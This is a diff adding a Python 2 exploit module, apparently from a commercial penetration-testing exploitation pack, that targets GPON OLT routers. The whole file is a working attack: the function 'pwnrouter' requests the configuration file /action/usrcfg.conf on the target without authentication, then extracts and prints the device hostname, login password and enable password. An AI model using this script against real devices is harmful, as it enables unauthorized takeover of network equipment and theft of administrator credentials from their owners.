@@ -1,0 +1,47 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_gpon_1'
+_vendor_ = 'gpon'
+_model_  = ['OLT']
+_vuln_   = 'Access Bypass Vulnerability'
+_cve_    = ''
+_ref_    = 'https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5534.php'
+_port_   = 443
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = "https://%s:%s/action/usrcfg.conf" % (host,port)
+    response = requests.get(url, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+    
+  m = re.search('!\\s+hostname (\\S+)\\s+password (\\S+)\\s+enable password (\\S+)\\s+!', response.text)
+  if m is None:
+    print '[+] %s not vulnerable' % host
+    print response.text
+  else:
+    print '[+] %s vulnerable' % host
+    hostname = m.group(1)
+    password = m.group(2)
+    epassword = m.group(3)
+    print('Hostname: %s\nPassword: %s\nEnable password: %s\n'%(hostname,password,epassword))
+    print response.text            
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
